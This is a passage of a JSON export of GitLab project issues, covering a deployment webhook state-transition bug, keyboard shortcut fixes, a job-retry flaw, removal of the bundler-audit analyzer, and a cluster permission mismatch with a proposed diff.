flag","frontend","group::integrations","maintenance::refactor","section::dev","type::maintenance"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"}],"author":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"type":"ISSUE","assignee":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347506","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347506","notes":"https://gitlab.com/api/v4/projects/278964/issues/347506/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347506/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347506","relative":"#347506","full":"gitlab-org/gitlab#347506"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98724941,"iid":347502,"project_id":278964,"title":"Allow 'skipped -\u003e created' state transitions in deployment jobs","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\nDisallowing a `skipped` to `created` state transition on `Deployment` objects causes it to miss sending a deployment `running` state web-hook notification.\n\n### Steps to reproduce\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\n\n1. Setup a webhook receiver URL. I used https://webhook.site/ as an example.\n2. Create a project with CI enabled and configure it to use the webhook under Project \u003e Settings \u003e Webhooks\n3. Configure the webhook to only send `Deployment events`\n4. Add the following as the pipeline configuration for the project via CI/CD \u003e Editor\n\n```\nimage: bash:latest\n\nbuild:\n  stage: build\n  when: manual\n  script: echo\n\ndeploy:\n  stage: deploy\n  environment: production\n  needs:\n    - build\n  script: echo\n```\n\n5. Run the pipeline, and check the webhook URL for received events\n6. The following bug is observed:\n  - Expectation: Two deployment events are received: deployment `running` and `success` states\n  - Observed: Only a single deployment event is received: deployment `success` state\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\nThis can be tested on any CI/CD enabled project.\nAn example is difficult to provide as it requires measuring from an external receiver (webhook URL).\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\n\nDeployment `running` webhook events are not sent for affected jobs\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\n\nDeployment `running` webhook events are sent for all deployment jobs\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\nSee customer support ticket: https://gitlab.zendesk.com/agent/tickets/254907 (internal link) or the instructions to use webhooks above.\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\nThis bug happens on GitLab.com\n\n### Possible fixes\n\n#### Notes from implementation review\n\nWhen the pipeline's created, the `test` job starts with an initial state of `created`, and so does its associated deployment.\n\nThe `test` job is then initially moved to `skipped` because it depends on a manual action of `build` job. This causes the Deployment object's state too to go from `created` (initial) to `skipped`.\n\nHowever, when the `build` job is played, the `test` job's state updates from `skipped` to `created` instantly.\n\nThis action gets deemed illegal by the deployment state sync because there's an assumption that `created` is not a state that can ever recur. We do not handle receiving a `created` state from the job: https://gitlab.com/gitlab-org/gitlab/blob/989928ec3dd95afd52db9f26d3a9d9210fbf2b69/app/models/deployment.rb#L378-393 so if it ever came in the result would be an error of `The status created is invalid` and the state of the deployment job will remain `skipped`.\n\nThe pipeline moves on though despite the above (because its not a fatal exception, its logged and control is returned) and when the `test` job moves to `running` the deployment equally fails to move to `running` now because the deployment state machine does not accept a `skipped` to `running` movement, registering an error:\n\n```\n\"exception.class\": \"Deployment::StatusSyncError\"\n\"exception.message\": \"Cannot transition status via :run from :skipped (Reason(s): Status cannot transition via \\\"run\\\")\"\n```\n\nThe MR https://gitlab.com/gitlab-org/gitlab/-/merge_requests/72746 hid the logs `The status created is invalid` from being logged as it was decided in its discussion that the deployment's state must never need to go 'backwards' to `created` and that whatever was attempting it was a bug, but the way the job transitions occur for `needs` + `when:manual` jobs appears to suggest this is a possible and normal state flow. The issue of https://gitlab.com/gitlab-org/gitlab/-/issues/341561 further causes skipped states to occur for jobs after they have been created.\n\n#### Fix suggestion\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e\n\n1. The handling at https://gitlab.com/gitlab-org/gitlab/blob/989928ec3dd95afd52db9f26d3a9d9210fbf2b69/app/models/deployment.rb#L378-393 should include accepting `created` events from the job state\n2. The event state machine should include a valid transition to `:created` from `:skipped`: https://gitlab.com/gitlab-org/gitlab/blob/989928ec3dd95afd52db9f26d3a9d9210fbf2b69/app/models/deployment.rb#L62-81\n\n/cc @mlockhart @tmike","state":"closed","created_at":"2021-12-09T06:07:50.111Z","updated_at":"2022-05-24T12:02:32.694Z","closed_at":"2022-05-19T10:37:12.891Z","closed_by":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"labels":["Category:Environment Management","Deliverable","Next Up","Release::P1","approaching-SLO","customer","devops::release","group::release","missed-SLO","priority::2","section::ops","severity::2","type::bug","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"}],"author":{"id":7536567,"username":"hchouraria","name":"Harsh Chouraria","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7536567/avatar.png","web_url":"https://gitlab.com/hchouraria"},"type":"ISSUE","assignee":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"user_notes_count":15,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347502","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347502","notes":"https://gitlab.com/api/v4/projects/278964/issues/347502/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347502/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347502","relative":"#347502","full":"gitlab-org/gitlab#347502"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98719929,"iid":347497,"project_id":278964,"title":"Fix keyboard shortcuts on Issue page","description":"Fix broken Issue sidebar keyboard shortcut and add rspec tests for them.","state":"closed","created_at":"2021-12-09T02:39:14.683Z","updated_at":"2022-01-27T20:32:54.715Z","closed_at":"2021-12-13T22:13:40.416Z","closed_by":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"labels":["devops::plan","frontend","group::product planning","section::dev","test","type::bug","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"}],"author":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"type":"ISSUE","assignee":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347497","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":0,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347497","notes":"https://gitlab.com/api/v4/projects/278964/issues/347497/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347497/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347497","relative":"#347497","full":"gitlab-org/gitlab#347497"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98719510,"iid":347495,"project_id":278964,"title":"Follow-up from \"Fix regression in pipeline coverage API response\"","description":"The following discussion from !76299 should be addressed:\n\n- [ ] @georgekoltsov started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/76299#note_756998042):  (+1 comment)\n\n    \u003e non-blocking: I know this is a regression fix, but since you're adding missing coverage, does it make sense to test all of the exposed fields, to present potential other fields regression?","state":"closed","created_at":"2021-12-09T02:24:21.663Z","updated_at":"2022-01-11T05:59:35.738Z","closed_at":"2022-01-11T05:59:35.719Z","closed_by":{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"},"labels":["Category:Code Testing and Coverage","devops::verify","group::pipeline insights","section::ops","testing::coverage","type::maintenance","workflow::in dev"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"}],"author":{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"},"type":"ISSUE","assignee":{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347495","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347495","notes":"https://gitlab.com/api/v4/projects/278964/issues/347495/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347495/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347495","relative":"#347495","full":"gitlab-org/gitlab#347495"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98718461,"iid":347493,"project_id":278964,"title":"`Ci::PlayBuildService` could retry inappropriate jobs","description":"## Problem\n\n`Ci::PlayBuildService` currently has a fallback code to retry a job if `build.enqueue` is failed.\n\n```\n      # Try to enqueue the build, otherwise create a duplicate.\n      #\n      if build.enqueue\n        ...\n      else\n        Ci::Build.retry(build, current_user)\n      end\n```\n\nThis causes a bug that, for example, non retryable jobs, such as [archived jobs](https://docs.gitlab.com/ee/user/admin_area/settings/continuous_integration.html#archive-jobs), can be retried.\n\n## Proposal\n\nRemove `Ci::Build.retry` as the jobs to be retried must directly call `Ci::RetryBuildService` today. This effectively simplifies https://gitlab.com/gitlab-org/gitlab/-/issues/353479.\n\n## Related\n\nhttps://gitlab.com/gitlab-org/gitlab/-/merge_requests/75710#note_755708559","state":"closed","created_at":"2021-12-09T01:58:20.439Z","updated_at":"2022-03-08T13:22:39.918Z","closed_at":"2022-03-08T13:22:39.888Z","closed_by":{"id":4059128,"username":"avielle","name":"Avielle Wolfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4059128/avatar.png","web_url":"https://gitlab.com/avielle"},"labels":["Category:Pipeline Authoring","automation:ml","backend","devops::verify","group::pipeline authoring","maintenance::refactor","section::ops","type::maintenance","workflow::blocked"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[{"id":4059128,"username":"avielle","name":"Avielle Wolfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4059128/avatar.png","web_url":"https://gitlab.com/avielle"}],"author":{"id":758045,"username":"shinya.maeda","name":"Shinya Maeda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/758045/avatar.png","web_url":"https://gitlab.com/shinya.maeda"},"type":"ISSUE","assignee":{"id":4059128,"username":"avielle","name":"Avielle Wolfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4059128/avatar.png","web_url":"https://gitlab.com/avielle"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347493","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347493","notes":"https://gitlab.com/api/v4/projects/278964/issues/347493/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347493/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347493","relative":"#347493","full":"gitlab-org/gitlab#347493"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98718001,"iid":347491,"project_id":278964,"title":"[15.0] Remove bundler-audit analyzer","description":"\u003c!-- Use this template as a starting point for deprecations. --\u003e\n\n### Deprecation Summary\n\n\u003c!--\nThis should contain a brief description of the feature or functionality that is deprecated. The description should clearly state the potential impact of the deprecation to end users.\n\nIt is recommended that you link to the documentation.\n\nThe description of the deprecation should state what actions the user should take to rectify the behavior. If the deprecation is scheduled for an upcoming release, the content should remain in the deprecations documentation page until it has been completed. For example, if a deprecation is announced in 14.9 and scheduled to be completed in 15.0, the same content would be included in the documentation for 14.9, 14.10, and 15.0.\n--\u003e\n\nDependency Scanning uses [bundler-audit](https://gitlab.com/gitlab-org/security-products/analyzers/bundler-audit) and [gemnasium](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium) for analyzing ruby projects. `bundler-audit` was added because it has a different advisory source from `gemnasium`: [ruby-advisory-db](https://github.com/rubysec/ruby-advisory-db). However, the gemnasium advisory database [gemnasium-db](https://gitlab.com/gitlab-org/security-products/gemnasium-db) is now a [superset](https://gitlab.com/gitlab-org/gitlab/-/issues/288322) of `ruby-advisory-db`. This has made `bundler-audit` redundant.\n\nThis change will only affect users that are using the analyzer directly either through changing the CI configuration for Dependency Scanning to use `bundler-audit` directly or by using the `bundler-audit` docker image in a job.\n\n### Breaking Changes\n\n- Dependency Scanning job `bundler-audit-dependency_scanning` will no longer be available: https://gitlab.com/gitlab-org/gitlab/blob/14-5-stable-ee/lib/gitlab/ci/templates/Security/Dependency-Scanning.gitlab-ci.yml#L127\n- `bundler-audit` container registry and containers (e.g. `registry.gitlab.com/gitlab-org/security-products/analyzers/bundler-audit:$TAG`) will no longer be available\n\n### Affected Topology\n\n\u003c!--\nWho is affected by this deprecation, Self-managed users, SaaS users, or both? This is especially important when nearing the annual major release where breaking changes and removals are typically introduced. These changes might be seen on GitLab.com before the official release date.\n--\u003e\n\nBoth self-managed and saas users will be affected.\n\n### Affected Tier\n\n* Ultimate\n\n### Checklist\n\n- [ ] @mention your stage's stable counterparts on this issue. For example, Customer Support, Customer Success (Technical Account Manager), Product Marketing Manager.\n  - To see who the stable counterparts are for a product team visit [product categories](https://about.gitlab.com/handbook/product/categories/)\n       - If there is no stable counterpart listed for Sales/CS please mention `@timtams`\n       - If there is no stable counterpart listed for Support please @mention `@gitlab-com/support/managers`\n       - If there is no stable counterpart listed for Marketing please mention `@williamchia`\n\n### Deprecation Milestone\n\n\u003c!-- In which milestone will this deprecation be announced ? --\u003e\n\n14.6\n\n### Planned Removal  Milestone\n\n15.0\n\n### Implementation Plan\n\n- [x] update GitLab project (https://gitlab.com/gitlab-org/gitlab/-/merge_requests/86704)\n  - [x] update docs to remove `bundler-audit` mentions: https://docs.gitlab.com/ee/user/application_security/dependency_scanning/\n  - [x] remove job integration test for Bundler `2.1.4`, and remove mentions of this test from the docs: \n    - [x] remove `2.1.4` in the `Tested Versions` cell of the `Bundler` row in this table: https://docs.gitlab.com/ee/user/application_security/dependency_scanning/#obtaining-dependency-information-by-parsing-lockfiles\n    - [x] remove `Bundler` row from this table: https://docs.gitlab.com/ee/user/application_security/dependency_scanning/#obtaining-dependency-information-by-running-a-package-manager-to-generate-a-parsable-file \n  - [x] remove `bundler-audit` from the Dependency Scanning CI template https://gitlab.com/gitlab-org/gitlab/blob/master/lib/gitlab/ci/templates/Jobs/Dependency-Scanning.gitlab-ci.yml and corresponding specs\n- [x] ~archive bundler-audit project~\n  - note: the decision to archive the project has been postponed so that the docker image can continue getting automatic rebuilds\n  - [x] update [bundler audit](https://gitlab.com/gitlab-org/security-products/analyzers/bundler-audit) analyzer `README.md` to say that this project is no longer used and will be removed in 3 months.\n  - [x] create issue to archive bundler-audit project (https://gitlab.com/gitlab-org/gitlab/-/issues/362242)\n- [x] remove tests and mentions of the analyzer from other projects\n  - [x] specs in https://gitlab.com/gitlab-org/security-products/security-report-schemas\n  - [x] support for templated job in https://gitlab.com/gitlab-org/security-products/ci-templates/-/blob/master/includes-dev/qa-dependency_scanning.yml\n- [x] update handbook page (https://about.gitlab.com/handbook/engineering/development/sec/secure/composition-analysis) (https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/104032)\n  - [x] remove analyzer and upstream project from reaction rotation support list and links (e.g. vuln dashboard)\n  - [x] remove analyzer mentions\n- [x] archive the `bundler-audit` mirror project https://gitlab.com/gitlab-org/security-products/dependencies/bundler-audit\n- [x] create removal announcement (which is a different yml than a deprecation)","state":"closed","created_at":"2021-12-09T01:46:10.423Z","updated_at":"2022-12-29T03:09:10.032Z","closed_at":"2022-05-12T18:17:07.150Z","closed_by":{"id":4668304,"username":"ifrenkel","name":"Igor Frenkel","state":"active","avatar_url":"https://secure.gravatar.com/avatar/a73e8113c53ac25297ce751e59bbb1d3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ifrenkel"},"labels":["Category:Dependency Scanning","Deliverable","Enterprise Edition","GitLab Ultimate","backend","devops::secure","documentation","group::composition analysis","maintenance::removal","priority::1","section::sec","type::maintenance","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":4668304,"username":"ifrenkel","name":"Igor Frenkel","state":"active","avatar_url":"https://secure.gravatar.com/avatar/a73e8113c53ac25297ce751e59bbb1d3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ifrenkel"}],"author":{"id":4668304,"username":"ifrenkel","name":"Igor Frenkel","state":"active","avatar_url":"https://secure.gravatar.com/avatar/a73e8113c53ac25297ce751e59bbb1d3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ifrenkel"},"type":"ISSUE","assignee":{"id":4668304,"username":"ifrenkel","name":"Igor Frenkel","state":"active","avatar_url":"https://secure.gravatar.com/avatar/a73e8113c53ac25297ce751e59bbb1d3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ifrenkel"},"user_notes_count":27,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347491","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":18,"completed_count":17},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"17 of 18 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347491","notes":"https://gitlab.com/api/v4/projects/278964/issues/347491/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347491/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347491","relative":"#347491","full":"gitlab-org/gitlab#347491"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7298,"epic":{"id":405983,"iid":7298,"title":"remove bundler-audit","url":"/groups/gitlab-org/-/epics/7298","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":98708023,"iid":347480,"project_id":278964,"title":"Follow-up from \"Add GraphQL to the Environment Rollback Components\"","description":"The following discussion from !75560 should be addressed:\n\n- [ ] @jiaan started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75560#note_751883541):  (+2 comments)\n\n    \u003e **Question (non-blocking):** Is there anyway we could avoid using a question mark as an API property? And if we absolutely have to, WDYT about replacing this and other instances with a constant like `IS_LAST_KEY`? I think that would make this a bit more readable. As it stands the string key and the question mark mixed in with with optional chaining made me do a double take. :eyes:","state":"closed","created_at":"2021-12-08T22:05:57.517Z","updated_at":"2022-01-12T15:40:27.897Z","closed_at":"2022-01-12T15:40:27.879Z","closed_by":{"id":262533,"username":"afontaine","name":"Andrew Fontaine","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/262533/avatar.png","web_url":"https://gitlab.com/afontaine"},"labels":["auto updated","backend","devops::release","frontend","group::release","maintenance::refactor","section::ops","workflow::in dev"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":262533,"username":"afontaine","name":"Andrew Fontaine","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/262533/avatar.png","web_url":"https://gitlab.com/afontaine"}],"author":{"id":262533,"username":"afontaine","name":"Andrew Fontaine","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/262533/avatar.png","web_url":"https://gitlab.com/afontaine"},"type":"ISSUE","assignee":{"id":262533,"username":"afontaine","name":"Andrew Fontaine","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/262533/avatar.png","web_url":"https://gitlab.com/afontaine"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347480","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347480","notes":"https://gitlab.com/api/v4/projects/278964/issues/347480/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347480/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347480","relative":"#347480","full":"gitlab-org/gitlab#347480"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98704240,"iid":347471,"project_id":278964,"title":"Agents and Cluster Image Scanning vulnerabilities require different privileges to view","description":"\u003c!-- This template is a great use for issues that are feature::additions or technical tasks for larger issues.--\u003e\n\n### Summary\n\nCurrently, there is a disparity between the permission levels for vulnerabilities and Clusters::Agents in Graphql.\n\n1. Agent data [requires `:admin_cluster` to be viewed](https://gitlab.com/gitlab-org/gitlab/-/blob/6eddea062548d8e9befa41c24a3eff370032daf5/app/graphql/types/clusters/agent_type.rb#L8)\n1. [`:admin_cluster` requires Maintainer access on the project](https://gitlab.com/gitlab-org/gitlab/-/blob/6eddea062548d8e9befa41c24a3eff370032daf5/app/policies/project_policy.rb#L434)\n1. Vulnerability data [requires `:read_security_resource` to be viewed](https://gitlab.com/gitlab-org/gitlab/-/blob/6eddea062548d8e9befa41c24a3eff370032daf5/ee/app/graphql/types/vulnerability_type.rb#L10)\n1. [`:read_security_resource` requires Developer access on the project](https://gitlab.com/gitlab-org/gitlab/-/blob/6eddea062548d8e9befa41c24a3eff370032daf5/ee/app/policies/ee/project_policy.rb#L207)\n\nThis leads to a situation where users cannot see the location data for Cluster Image Scanning vulnerabilities unless they are Maintainers, but they can see the other vulnerability data.\n\n### Proposal\n\n\u003c!-- Use this section to explain the feature and how it will work. It can be helpful to add technical details, design proposals, and links to related epics or issues. --\u003e\n\n\u003c!-- Consider adding related issues and epics to this issue. You can also reference the Feature Proposal Template (https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Feature%20proposal%20-%20detailed.md) for additional details to consider adding to this issue. Additionally, as a data oriented organization, when your feature exits planning breakdown, consider adding the `What does success look like, and how can we measure that?` section.\n--\u003e\n\n1. Change all the Cluster _queries_ to require `:read_cluster` permission rather than `:admin_cluster` permission\n1. All the Cluster _mutations_ should continue to require `:admin_cluster` permission\n1. Move `:read_cluster` from `:maintainer_access` to `:developer_access`\n\n\u003c!-- Label reminders\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e\n\n### Implementation Plan\n\n```diff\ndiff --git a/app/graphql/types/clusters/agent_type.rb b/app/graphql/types/clusters/agent_type.rb\n--- a/app/graphql/types/clusters/agent_type.rb\n+++ b/app/graphql/types/clusters/agent_type.rb\n@@ -5,7 +5,7 @@ module Clusters\n     class AgentType \u003c BaseObject\n       graphql_name 'ClusterAgent'\n\n-      authorize :admin_cluster\n+      authorize :read_cluster\n\n       connection_type_class(Types::CountableConnectionType)\n```\n\n```diff\ndiff --git a/app/policies/project_policy.rb b/app/policies/project_policy.rb\n--- a/app/policies/project_policy.rb\n+++ b/app/policies/project_policy.rb\n@@ -356,6 +356,7 @@ class 